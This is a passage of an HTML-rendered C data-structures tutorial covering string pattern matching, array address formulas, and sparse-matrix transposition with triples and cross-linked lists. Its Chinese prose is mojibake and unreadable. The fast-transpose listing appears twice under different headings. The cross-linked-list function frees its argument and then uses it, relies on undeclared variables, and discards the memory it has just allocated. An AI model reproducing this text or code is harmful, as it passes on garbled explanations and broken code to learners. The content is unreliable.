class="hljs-built_in">strcat</span>(result-&gt;data, str2-&gt;data);<br>    result-&gt;length = str1-&gt;length + str2-&gt;length;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-comment">// æ¨¡å¼åŒ¹é…æ“ä½œï¼Œåœ¨ä¸»ä¸² str ä¸­æŸ¥æ‰¾æ¨¡å¼ä¸² pattern çš„ä½ç½®ï¼Œè¿”å›é¦–æ¬¡åŒ¹é…ä½ç½®</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">IndexOf</span><span class="hljs-params">(SString *str, SString *pattern)</span> </span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt;= str-&gt;length - pattern-&gt;length; i++) &#123;<br>        <span class="hljs-type">int</span> j = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">while</span> (j &lt; pattern-&gt;length &amp;&amp; str-&gt;data[i + j] == pattern-&gt;data[j]) &#123;<br>            j++;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (j == pattern-&gt;length) &#123;<br>            <span class="hljs-keyword">return</span> i; <span class="hljs-comment">// æ‰¾åˆ°åŒ¹é…ä½ç½®</span><br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>; <span class="hljs-comment">// æœªæ‰¾åˆ°åŒ¹é…</span><br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="æ•°ç»„"><a href="#æ•°ç»„" class="headerlink" title="æ•°ç»„"></a>æ•°ç»„</h2><p>æ•°ç»„æ˜¯å…·æœ‰ç›¸åŒç±»å‹å…ƒç´ çš„é›†åˆï¼Œå…ƒç´ åœ¨å†…å­˜ä¸­æŒ‰é¡ºåºå­˜å‚¨ã€‚æ ¹æ®æ•°ç»„ç»´åº¦çš„ä¸åŒï¼Œæ•°ç»„å¯ä»¥åˆ†ä¸ºä¸€ç»´æ•°ç»„ã€äºŒç»´æ•°ç»„å’Œä¸‰ç»´æ•°ç»„ã€‚</p><h4 id="ä¸€ç»´æ•°ç»„"><a href="#ä¸€ç»´æ•°ç»„" class="headerlink" title="ä¸€ç»´æ•°ç»„"></a>ä¸€ç»´æ•°ç»„</h4><p>ä¸€ç»´æ•°ç»„æ˜¯ä¸€ç»„å…·æœ‰ç›¸åŒç±»å‹çš„å˜é‡ã€‚æ•°ç»„ä¸­çš„æ¯ä¸ªå…ƒç´ éƒ½æœ‰ä¸€ä¸ªç´¢å¼•ï¼Œç´¢å¼•ä»0å¼€å§‹ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> arr[<span class="hljs-number">5</span>] = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>&#125;;<br></code></pre></td></tr></table></figure><p>å¯ä»¥é€šè¿‡ç´¢å¼•è®¿é—®å’Œä¿®æ”¹æ•°ç»„ä¸­çš„å…ƒç´ ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">arr[<span class="hljs-number">2</span>] = <span class="hljs-number">10</span>; <span class="hljs-comment">// ä¿®æ”¹ç¬¬ä¸‰ä¸ªå…ƒç´ çš„å€¼ä¸º10</span><br></code></pre></td></tr></table></figure><h4 id="äºŒç»´æ•°ç»„"><a href="#äºŒç»´æ•°ç»„" class="headerlink" title="äºŒç»´æ•°ç»„"></a>äºŒç»´æ•°ç»„</h4><p>è¡Œä¼˜å…ˆå­˜å‚¨</p><p>Loc(i,j)&#x3D;Loc(r,c)+(iâˆ’r)Ã—nÃ—xs+(jâˆ’c)Ã—xs</p><p>åˆ—ä¼˜å…ˆå­˜å‚¨æ–¹å¼</p><p>Loc(i,j)&#x3D;Loc(r,c)+(jâˆ’c)Ã—mÃ—xs+(iâˆ’r)Ã—xs</p><p><code>Loc(i, j)</code>ï¼šè¡¨ç¤ºäºŒç»´æ•°ç»„ä¸­å…ƒç´  <code>A[i][j]</code> çš„å†…å­˜åœ°å€ã€‚</p><p><code>Loc(r, c)</code>ï¼šè¡¨ç¤ºæ•°ç»„çš„åŸºåœ°å€ï¼Œä¹Ÿå°±æ˜¯ <code>A[r][c]</code> çš„å†…å­˜åœ°å€ã€‚é€šå¸¸æƒ…å†µä¸‹ï¼Œ<code>r</code> å’Œ <code>c</code> å¯ä»¥å–å€¼ä¸º <code>0</code>ï¼Œå³ <code>Loc(0, 0)</code> ä¸ºåŸºåœ°å€ã€‚</p><p><code>j - c</code>ï¼šè¡¨ç¤º <code>j</code> åˆ—ç›¸å¯¹äºåŸºå‡†åˆ— <code>c</code> çš„åç§»åˆ—æ•°ã€‚</p><p><code>m</code>ï¼šæ•°ç»„çš„è¡Œæ•°ï¼ˆæ¯åˆ—çš„å…ƒç´ æ•°ï¼‰ã€‚</p><p><code>xs</code>ï¼šæ¯ä¸ªå…ƒç´ å æ®çš„å­˜å‚¨å•å…ƒå¤§å°ï¼ˆä¾‹å¦‚ <code>int</code> ç±»å‹é€šå¸¸ä¸º <code>4</code> å­—èŠ‚ï¼‰ã€‚</p><p><code>i - r</code>ï¼šè¡¨ç¤º <code>i</code> è¡Œç›¸å¯¹äºåŸºå‡†è¡Œ <code>r</code> çš„åç§»è¡Œæ•°ã€‚</p><p>ä¾‹å­</p><p>è®¾äºŒç»´æ•°ç»„a[1..60] [2.70]çš„åŸºåœ°å€ä¸º2048ï¼Œæ¯ä¸ªå…ƒç´ å 2ä¸ªå­˜å‚¨å•å…ƒï¼Œè‹¥ä»¥è¡Œä¼˜å…ˆé¡ºåºå­˜å‚¨ï¼Œå…ƒç´ a[32] [58]çš„åœ°å€æ˜¯</p><h3 id="å·²çŸ¥æ¡ä»¶"><a href="#å·²çŸ¥æ¡ä»¶" class="headerlink" title="å·²çŸ¥æ¡ä»¶"></a>å·²çŸ¥æ¡ä»¶</h3><ul><li><p><strong>åŸºåœ°å€</strong>ï¼š2048</p></li><li><p>æ•°ç»„ç»´åº¦</p><p>ï¼š</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">a</span>[<span class="hljs-number">1</span>..<span class="hljs-number">60</span>][<span class="hljs-number">2</span>..<span class="hljs-number">70</span>]<br></code></pre></td></tr></table></figure><ul><li>è¡Œæ•°ï¼š60</li><li>åˆ—æ•°ï¼š69ï¼ˆä»åˆ— 2 åˆ°åˆ— 70ï¼Œå…± 69 åˆ—ï¼‰</li></ul></li><li><p><strong>å…ƒç´ å¤§å°</strong>ï¼šæ¯ä¸ªå…ƒç´ å  2 ä¸ªå­˜å‚¨å•å…ƒï¼ˆå³ 2 å­—èŠ‚ï¼‰</p></li><li><p><strong>ç›®æ ‡å…ƒç´ </strong>ï¼š<code>a[32][58]</code></p></li><li><p><strong>å­˜å‚¨æ–¹å¼</strong>ï¼šè¡Œä¼˜å…ˆå­˜å‚¨</p></li></ul><h3 id="è¡Œä¼˜å…ˆå­˜å‚¨å¯»å€å…¬å¼"><a href="#è¡Œä¼˜å…ˆå­˜å‚¨å¯»å€å…¬å¼" class="headerlink" title="è¡Œä¼˜å…ˆå­˜å‚¨å¯»å€å…¬å¼"></a>è¡Œä¼˜å…ˆå­˜å‚¨å¯»å€å…¬å¼</h3><p>åœ¨è¡Œä¼˜å…ˆå­˜å‚¨ä¸­ï¼ŒäºŒç»´æ•°ç»„çš„å¯»å€å…¬å¼ä¸ºï¼š</p><p>Loc(i,j)&#x3D;Loc(r,c)+(iâˆ’r)Ã—nÃ—xs+(jâˆ’c)Ã—xs</p><p>å…¶ä¸­ï¼š</p><ul><li><code>base_address = 2048</code></li><li><code>i = 32</code>ï¼ˆç›®æ ‡è¡Œç´¢å¼•ï¼‰</li><li><code>j = 58</code>ï¼ˆç›®æ ‡åˆ—ç´¢å¼•ï¼‰</li><li><code>r = 1</code>ï¼ˆèµ·å§‹è¡Œç´¢å¼•ï¼‰</li><li><code>c = 2</code>ï¼ˆèµ·å§‹åˆ—ç´¢å¼•ï¼‰</li><li><code>n = 69</code>ï¼ˆæ¯è¡Œçš„åˆ—æ•°ï¼‰</li><li><code>xs = 2</code>ï¼ˆæ¯ä¸ªå…ƒç´ çš„å¤§å°ï¼‰</li></ul><p>äºŒç»´æ•°ç»„å¯ä»¥çœ‹ä½œæ˜¯æ•°ç»„çš„æ•°ç»„ï¼Œé€šå¸¸ç”¨äºè¡¨ç¤ºçŸ©é˜µæˆ–è¡¨æ ¼æ•°æ®ã€‚å£°æ˜ä¸€ä¸ªäºŒç»´æ•°ç»„çš„æ–¹æ³•å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> matrix[<span class="hljs-number">3</span>][<span class="hljs-number">3</span>] = &#123;<br>    &#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>&#125;,<br>    &#123;<span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>&#125;,<br>    &#123;<span class="hljs-number">7</span>, <span class="hljs-number">8</span>, <span class="hljs-number">9</span>&#125;<br>&#125;;<br></code></pre></td></tr></table></figure><p>è®¿é—®äºŒç»´æ•°ç»„å…ƒç´ ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> value = matrix[<span class="hljs-number">1</span>][<span class="hljs-number">2</span>]; <span class="hljs-comment">// è·å–ç¬¬äºŒè¡Œç¬¬ä¸‰åˆ—çš„å…ƒç´ </span><br></code></pre></td></tr></table></figure><h4 id="çŸ©é˜µè½¬ç½®"><a href="#çŸ©é˜µè½¬ç½®" class="headerlink" title="çŸ©é˜µè½¬ç½®"></a>çŸ©é˜µè½¬ç½®</h4><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs maxima">    SimpleTranspose(<span class="hljs-built_in">matrix</span>, <span class="hljs-built_in">transpose</span>, <span class="hljs-number">3</span>, <span class="hljs-number">3</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Transposed Matrix:\n&quot;</span>);<br>    PrintMatrix(<span class="hljs-built_in">transpose</span>, <span class="hljs-number">3</span>, <span class="hljs-number">3</span>);<br><br>    <span class="hljs-built_in">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p> ä¸‰å…ƒç»„è¡¨ç¤ºçš„ç¨€ç–çŸ©é˜µè½¬ç½®</p><p>è¿™ç§æ–¹æ³•é€‚ç”¨äºç¨€ç–çŸ©é˜µï¼Œä½¿ç”¨ä¸‰å…ƒç»„è¡¨ç¤ºæ³•ï¼Œä»…å­˜å‚¨éé›¶å…ƒç´ çš„ä½ç½®å’Œå€¼ã€‚</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs xl">cå¤åˆ¶ä»£ç #include &lt;stdio.h&gt;<br><br>#define MAXSIZE <span class="hljs-number">100</span><br><br>typedef struct &#123;<br>    int row;<br>    int col;<br>    int value;<br>&#125; Triple;<br><br>typedef struct &#123;<br>    Triple <span class="hljs-keyword">data</span>[MAXSIZE];<br>    int rows;<br>    int cols;<br>    int len;<br>&#125; TSMatrix;<br><br>void FastTranspose(TSMatrix *A, TSMatrix *B) &#123;<br>    B-&gt;<span class="hljs-function"><span class="hljs-title">rows</span> = A-&gt;</span>cols;<br>    B-&gt;<span class="hljs-function"><span class="hljs-title">cols</span> = A-&gt;</span>rows;<br>    B-&gt;<span class="hljs-function"><span class="hljs-title">len</span> = A-&gt;</span>len;<br><br>    <span class="hljs-function"><span class="hljs-title">int</span> num[A-&gt;</span><span class="hljs-function"><span class="hljs-title">cols</span>], position[A-&gt;</span>cols];<br><br>    <span class="hljs-comment">// Step 1: Initialize num array to count each column&#x27;s non-zero elements</span><br>    <span class="hljs-function"><span class="hljs-title">for</span> (int i = 0; i &lt; A-&gt;</span>cols; i++) num[i] = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-function"><span class="hljs-title">for</span> (int i = 0; i &lt; A-&gt;</span><span class="hljs-function"><span class="hljs-title">len</span>; i++) num[A-&gt;</span><span class="hljs-keyword">data</span>[i].col]++;<br><br>    <span class="hljs-comment">// Step 2: Calculate the starting position of each column in B</span><br>    position[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;<br>    <span class="hljs-function"><span class="hljs-title">for</span> (int i = 1; i &lt; A-&gt;</span>cols; i++) &#123;<br>        position[i] = position[i - <span class="hljs-number">1</span>] + num[i - <span class="hljs-number">1</span>];<br>    &#125;<br><br>    <span class="hljs-comment">// Step 3: Place each element of A in the correct position in B</span><br>    <span class="hljs-function"><span class="hljs-title">for</span> (int i = 0; i &lt; A-&gt;</span>len; i++) &#123;<br>        <span class="hljs-function"><span class="hljs-title">int</span> col = A-&gt;</span><span class="hljs-keyword">data</span>[i].col;<br>        int pos = position[col]++;<br>        B-&gt;<span class="hljs-function"><span class="hljs-title">data</span>[pos].row = A-&gt;</span><span class="hljs-keyword">data</span>[i].col;<br>        B-&gt;<span class="hljs-function"><span class="hljs-title">data</span>[pos].col = A-&gt;</span><span class="hljs-keyword">data</span>[i].row;<br>        B-&gt;<span class="hljs-function"><span class="hljs-title">data</span>[pos].value = A-&gt;</span><span class="hljs-keyword">data</span>[i].value;<br>    &#125;<br>&#125;<br><br>void PrintTSMatrix(TSMatrix *M) &#123;<br>    printf(<span class="hljs-string">&quot;row\tcol\tvalue\n&quot;</span>);<br>    <span class="hljs-function"><span class="hljs-title">for</span> (int i = 0; i &lt; M-&gt;</span>len; i++) &#123;<br>        <span class="hljs-function"><span class="hljs-title">printf</span>(&quot;%d\t%d\t%d\n&quot;, M-&gt;</span><span class="hljs-function"><span class="hljs-title">data</span>[i].row, M-&gt;</span><span class="hljs-function"><span class="hljs-title">data</span>[i].col, M-&gt;</span><span class="hljs-keyword">data</span>[i].value);<br>    &#125;<br>&#125;<br><br>int main() &#123;<br>    TSMatrix A = &#123;&#123;&#123;<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">3</span>&#125;, &#123;<span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">5</span>&#125;, &#123;<span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">7</span>&#125;, &#123;<span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">6</span>&#125;&#125;, <span class="hljs-number">3</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>&#125;;<br>    TSMatrix B;<br><br>    FastTranspose(&amp;A, &amp;B);<br>    printf(<span class="hljs-string">&quot;Transposed Sparse Matrix in Triple Form:\n&quot;</span>);<br>    PrintTSMatrix(&amp;B);<br><br>    return <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p> å¿«é€Ÿè½¬ç½®ç®—æ³•ï¼ˆé€‚ç”¨äºç¨€ç–çŸ©é˜µçš„å¿«é€Ÿè½¬ç½®ï¼‰</p><p>ä½¿ç”¨å¿«é€Ÿè½¬ç½®ç®—æ³•ï¼Œé€šè¿‡è¾…åŠ©æ•°ç»„ <code>num</code> å’Œ <code>position</code> æ¥åŠ é€Ÿè½¬ç½®è¿‡ç¨‹ã€‚</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs xl">cå¤åˆ¶ä»£ç #include &lt;stdio.h&gt;<br><br>#define MAXSIZE <span class="hljs-number">100</span><br><br>typedef struct &#123;<br>    int row;<br>    int col;<br>    int value;<br>&#125; Triple;<br><br>typedef struct &#123;<br>    Triple <span class="hljs-keyword">data</span>[MAXSIZE];<br>    int rows;<br>    int cols;<br>    int len;<br>&#125; TSMatrix;<br><br>void FastTranspose(TSMatrix *A, TSMatrix *B) &#123;<br>    B-&gt;<span class="hljs-function"><span class="hljs-title">rows</span> = A-&gt;</span>cols;<br>    B-&gt;<span class="hljs-function"><span class="hljs-title">cols</span> = A-&gt;</span>rows;<br>    B-&gt;<span class="hljs-function"><span class="hljs-title">len</span> = A-&gt;</span>len;<br><br>    <span class="hljs-function"><span class="hljs-title">int</span> num[A-&gt;</span><span class="hljs-function"><span class="hljs-title">cols</span>], position[A-&gt;</span>cols];<br><br>    <span class="hljs-comment">// Step 1: Initialize num array to count each column&#x27;s non-zero elements</span><br>    <span class="hljs-function"><span class="hljs-title">for</span> (int i = 0; i &lt; A-&gt;</span>cols; i++) num[i] = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-function"><span class="hljs-title">for</span> (int i = 0; i &lt; A-&gt;</span><span class="hljs-function"><span class="hljs-title">len</span>; i++) num[A-&gt;</span><span class="hljs-keyword">data</span>[i].col]++;<br><br>    <span class="hljs-comment">// Step 2: Calculate the starting position of each column in B</span><br>    position[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;<br>    <span class="hljs-function"><span class="hljs-title">for</span> (int i = 1; i &lt; A-&gt;</span>cols; i++) &#123;<br>        position[i] = position[i - <span class="hljs-number">1</span>] + num[i - <span class="hljs-number">1</span>];<br>    &#125;<br><br>    <span class="hljs-comment">// Step 3: Place each element of A in the correct position in B</span><br>    <span class="hljs-function"><span class="hljs-title">for</span> (int i = 0; i &lt; A-&gt;</span>len; i++) &#123;<br>        <span class="hljs-function"><span class="hljs-title">int</span> col = A-&gt;</span><span class="hljs-keyword">data</span>[i].col;<br>        int pos = position[col]++;<br>        B-&gt;<span class="hljs-function"><span class="hljs-title">data</span>[pos].row = A-&gt;</span><span class="hljs-keyword">data</span>[i].col;<br>        B-&gt;<span class="hljs-function"><span class="hljs-title">data</span>[pos].col = A-&gt;</span><span class="hljs-keyword">data</span>[i].row;<br>        B-&gt;<span class="hljs-function"><span class="hljs-title">data</span>[pos].value = A-&gt;</span><span class="hljs-keyword">data</span>[i].value;<br>    &#125;<br>&#125;<br><br>void PrintTSMatrix(TSMatrix *M) &#123;<br>    printf(<span class="hljs-string">&quot;row\tcol\tvalue\n&quot;</span>);<br>    <span class="hljs-function"><span class="hljs-title">for</span> (int i = 0; i &lt; M-&gt;</span>len; i++) &#123;<br>        <span class="hljs-function"><span class="hljs-title">printf</span>(&quot;%d\t%d\t%d\n&quot;, M-&gt;</span><span class="hljs-function"><span class="hljs-title">data</span>[i].row, M-&gt;</span><span class="hljs-function"><span class="hljs-title">data</span>[i].col, M-&gt;</span><span class="hljs-keyword">data</span>[i].value);<br>    &#125;<br>&#125;<br><br>int main() &#123;<br>    TSMatrix A = &#123;&#123;&#123;<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">3</span>&#125;, &#123;<span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">5</span>&#125;, &#123;<span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">7</span>&#125;, &#123;<span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">6</span>&#125;&#125;, <span class="hljs-number">3</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>&#125;;<br>    TSMatrix B;<br><br>    FastTranspose(&amp;A, &amp;B);<br>    printf(<span class="hljs-string">&quot;Transposed Sparse Matrix in Triple Form:\n&quot;</span>);<br>    PrintTSMatrix(&amp;B);<br><br>    return <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>åå­—é“¾è¡¨æ³•â€”é€‚ç”¨äºç¨€ç–çŸ©é˜µ</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs xl">typedef struct OLNode <span class="hljs-comment">/*åå­—é“¾è¡¨ç»“ç‚¹ç±»å‹å®šä¹‰*/</span><br>&#123;<br>    int row, col; <span class="hljs-comment">/*éé›¶å…ƒç´ çš„è¡Œå’Œåˆ—ä¸‹æ ‡*/</span><br>    DataType value; <span class="hljs-comment">/*éé›¶å…ƒç´ æ‰€åœ¨è¡Œè¡¨ã€åˆ—è¡¨çš„åç»§é“¾è¡¨*/</span><br>    struct OLNode *right, *down;<br>&#125; OLink;<br>typedef struct<br>&#123;<br>    OLink *row_head, *col_head; <span class="hljs-comment">/*è¡Œã€åˆ—é“¾è¡¨çš„å¤´æŒ‡é’ˆå‘é‡*/</span><br>    int m, n, len; <span class="hljs-comment">/*ç¨€ç–çŸ©é˜µçš„è¡Œæ•°ã€åˆ—æ•°ã€éé›¶å…ƒç´ ä¸ªæ•°*/</span><br>&#125; CrossList;<br>int CreateCrossList(CrossList *M)<br>&#123;<br>    int i, j;<br>    OLink p, q;<br>    <span class="hljs-comment">/*ç”¨åå­—é“¾è¡¨å­˜å‚¨ç»“æ„ï¼Œåˆ›å»ºç¨€ç–çŸ©é˜µ M*/</span><br>    <span class="hljs-keyword">if</span>(M != NULL) free(M);<br>    scanf(<span class="hljs-string">&quot;%d%d%d&quot;</span>, &amp;m, &amp;n, &amp;len); <span class="hljs-comment">/*è¾“å…¥ M çš„è¡Œæ•°ï¼Œåˆ—æ•°å’Œéé›¶å…ƒç´ ä¸ªæ•°*/</span><br>    M-&gt;<span class="hljs-function"><span class="hljs-title">m</span> = m; M-&gt;</span><span class="hljs-function"><span class="hljs-title">n</span> = n; M-&gt;</span>len = len;<br>    <span class="hljs-function"><span class="hljs-title">if</span> ((M-&gt;</span>row_head = (OLink*)malloc(m * sizeof(OLink))) == NULL) exit(OVERFLOW);<br>    <span class="hljs-function"><span class="hljs-title">if</span> ((M-&gt;</span>col_head = (OLink*)malloc(n * sizeof(OLink))) == NULL) exit(OVERFLOW);<br>    M-&gt;<span class="hljs-function"><span class="hljs-title">row_head</span> = M-&gt;</span>col_head = NULL; <span class="hljs-comment">/*åˆå§‹åŒ–è¡Œã€åˆ—å¤´æŒ‡é’ˆå‘é‡ï¼Œå„è¡Œã€åˆ—é“¾è¡¨ä¸ºç©ºçš„é“¾è¡¨*/</span><br>    <span class="hljs-keyword">for</span> (scanf(<span class="hljs-string">&quot;%d%d%d&quot;</span>, &amp;i, &amp;j, &amp;e); i != <span class="hljs-number">0</span>; scanf(<span class="hljs-string">&quot;%d%d%d&quot;</span>, &amp;i, &amp;j, &amp;e))<br>    &#123;<br>        <span class="hljs-keyword">if</span> ((p = (OLink*)malloc(sizeof(OLink))) == NULL) exit(OVERFLOW);<br>        <span class="hljs-function"><span class="hljs-title">p</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">row</span> = i; p-&gt;</span><span class="hljs-function"><span class="hljs-title">col</span> = j; p-&gt;</span>value = e; <span class="hljs-comment">/*ç”Ÿæˆç»“ç‚¹*/</span><br>        <span class="hljs-function"><span class="hljs-title">if</span> (M-&gt;</span>row_head == NULL)<br>            M-&gt;row_head = p;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>            <span class="hljs-function"><span class="hljs-title">for</span> (q = M-&gt;</span><span class="hljs-function"><span class="hljs-title">row_head</span>; q-&gt;</span><span class="hljs-function"><span class="hljs-title">right</span> &amp;&amp; q-&gt;</span><span class="hljs-function"><span class="hljs-title">right</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">col</span> &lt; j; q = q-&gt;</span>right);<br>            <span class="hljs-function"><span class="hljs-title">p</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">right</span> = q-&gt;</span><span class="hljs-function"><span class="hljs-title">right</span>; q-&gt;</span>right = p; <span class="hljs-comment">/*å¯»æ‰¾è¡Œè¡¨ä¸­çš„æ’å…¥ä½ç½®*/</span><br>        &#125;<br>        <span class="hljs-function"><span class="hljs-title">if</span> (M-&gt;</span>col_head == NULL)<br>            M-&gt;col_head = p;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>            <span class="hljs-function"><span class="hljs-title">for</span> (q = M-&gt;</span><span class="hljs-function"><span class="hljs-title">col_head</span>; q-&gt;</span><span class="hljs-function"><span class="hljs-title">down</span> &amp;&amp; q-&gt;</span><span class="hljs-function"><span class="hljs-title">down</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">row</span> &lt; i; q = q-&gt;</span>down);<br>            <span class="hljs-function"><span class="hljs-title">p</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">down</span> = q-&gt;</span><span class="hljs-function"><span class="hljs-title">down</span>; q-&gt;</span>down = p; <span class="hljs-comment">/*å¯»æ‰¾åˆ—è¡¨ä¸­çš„æ’å…¥ä½ç½®*/</span><br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="ä¸‰ç»´æ•°ç»„"><a href="#ä¸‰ç»´æ•°ç»„" class="headerlink" title="ä¸‰ç»´æ•°ç»„"></a>ä¸‰ç»´æ•°ç»„</h4><p>ä¸‰ç»´æ•°ç»„æ˜¯æ•°ç»„çš„è¿›ä¸€æ­¥æ‰©å±•ï¼Œé€šå¸¸ç”¨äºè¡¨ç¤ºå¤šç»´ç©ºé—´ä¸­çš„æ•°æ®ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> array3D[<span class="hljs-number">2</span>][<span class="hljs-number">3</span>][<span class="hljs-number">4</span>] = &#123;<br>    &#123;<br>        &#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span 